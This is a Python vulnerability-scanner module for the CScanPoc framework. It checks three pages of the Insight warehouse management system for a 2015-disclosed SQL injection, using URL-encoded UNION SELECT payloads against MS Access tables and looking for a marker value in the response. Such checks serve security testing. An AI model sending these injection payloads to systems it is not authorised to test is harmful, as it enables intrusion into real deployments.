# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Insight_0013'  # 平台漏洞编号，留空
    name = 'Insight仓储管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-01'  # 漏洞公布时间
    desc = '''
        Insight仓储管理系统
        /gjdcx/cxszbj.asp
        /gjdcx/ljszbj.asp
        /gjdcx/yhglbj.asp
        SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0129392'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Insight(英赛特仓储管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd8c0014d-9e75-4fa0-8496-947d2deaca0f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-0129390
            # http://www.wooyun.org/bugs/wooyun-2010-0129392
            hh = hackhttp.hackhttp()
            # SQL注入 Access 注入
            payloads = [
                self.target +
                '/gjdcx/cxszbj.asp?cxid=-7201%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
                self.target +
                '/gjdcx/ljszbj.asp?ljid=-7201%20UNION%20ALL%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,Exp(1)%20FROM%20MSysAccessObjects%16',
                self.target +
                '/gjdcx/yhglbj.asp?userid=-1000%20union%20select%20Exp(1),Exp(1),Exp(1),Exp(1)%20FROM%20MSysAccessObjects%16'
            ]
            exp_1 = '2.71828182845905'
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)

                if code == 200 and exp_1 in res:
                    #security_hole('sql injection:' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
